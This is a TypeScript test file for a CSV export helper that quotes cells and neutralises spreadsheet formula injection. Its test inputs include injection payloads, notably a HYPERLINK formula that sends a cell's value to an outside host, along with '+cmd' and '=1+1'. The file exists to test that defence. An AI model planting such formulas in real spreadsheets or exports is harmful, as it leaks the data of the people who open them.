/**
 * The CSV cells a browser export writes. A text cell that a spreadsheet
 * would read as a formula is kept as text; numbers stay numbers.
 */
import { describe, expect, it } from 'vitest'

import { csvCell, toCsv } from '@/lib/csv'

describe('csvCell', () => {
  it('writes plain text and numbers unchanged', () => {
    expect(csvCell('M-005')).toBe('M-005')
    expect(csvCell('Demographics / v1.0')).toBe('Demographics / v1.0')
    expect(csvCell(3)).toBe('3')
    expect(csvCell(-1)).toBe('-1')
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('quotes a comma, a quote or a line break', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('a\nb')).toBe('"a\nb"')
  })

  it.each([
    ['=1+1', "'=1+1"],
    ['+cmd', "'+cmd"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1', "'\t=1"],
  ])('keeps %j as text', (input, expected) => {
    expect(csvCell(input)).toBe(expected)
  })

  it('keeps a formula-like cell as text when it is also quoted', () => {
    expect(csvCell('=A1,B1')).toBe(`"'=A1,B1"`)
    expect(csvCell('\r=1')).toBe(`"'\r=1"`)
  })

  it('applies to every cell of a table', () => {
    expect(toCsv([['Subject', 'Queries'], ['=X', 2]])).toBe("﻿Subject,Queries\r\n'=X,2")
  })
})

describe('csvCell (export packages)', () => {
  it('quotes a cell with a quote, comma or line break', () => {
    expect(csvCell('plain')).toBe('plain')
    expect(csvCell('V1, Inclusion')).toBe('"V1, Inclusion"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('a\nb')).toBe('"a\nb"')
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('makes text a spreadsheet would run as a formula show as written', () => {
    expect(csvCell('=HYPERLINK("//x.io/"&D3)')).toBe('"\'=HYPERLINK(""//x.io/""&D3)"')
    expect(csvCell('+1')).toBe("'+1")
    expect(csvCell('-1')).toBe("'-1")
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(csvCell('\t=1')).toBe("'\t=1")
    expect(csvCell('\r=1')).toBe('"\'\r=1"')
    expect(csvCell('M-001')).toBe('M-001')
  })

  it('writes numbers and booleans as they are', () => {
    expect(csvCell(-3)).toBe('-3')
    expect(csvCell(7)).toBe('7')
    expect(csvCell(true)).toBe('true')
  })
})
